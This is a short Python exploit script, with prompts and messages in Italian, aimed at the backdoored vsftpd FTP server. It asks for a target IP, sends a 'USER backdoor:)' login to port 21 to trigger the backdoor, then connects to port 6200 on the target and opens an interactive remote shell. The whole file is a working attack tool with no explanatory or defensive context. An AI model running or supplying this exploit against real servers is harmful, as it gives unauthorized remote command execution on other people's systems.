import socket


TARGET_IP = input("Inserisci IP target:\n")
TARGET_PORT = 21  


def exploit_vsftpd(target_ip, target_port):
    try:
        print("[+] Connessione al server FTP...")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_port))

        banner = sock.recv(1024).decode()
        print(f"[+] Banner ricevuto: {banner}")

        payload = "USER backdoor:)\n"
        print(f"[+] Invio payload: {payload.strip()}")
        sock.send(payload.encode())

        sock.send(b"PASS exploit\n")

        print("[+] Controllo connessione alla backdoor...")
        backdoor_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        backdoor_sock.connect((target_ip, 6200))

        print("[+] Backdoor attivata! Accesso alla shell...")
        while True:
            command = input("shell> ")
            if command.lower() in ["exit", "quit"]:
                print("[+] Chiusura connessione...")
                break
            backdoor_sock.send((command + "\n").encode())
            response = backdoor_sock.recv(4096).decode()
            print(response)

        backdoor_sock.close()
        sock.close()
    except Exception as e:
        print(f"[-] Errore durante l'exploit: {e}")

if __name__ == "__main__":
    exploit_vsftpd(TARGET_IP, TARGET_PORT)
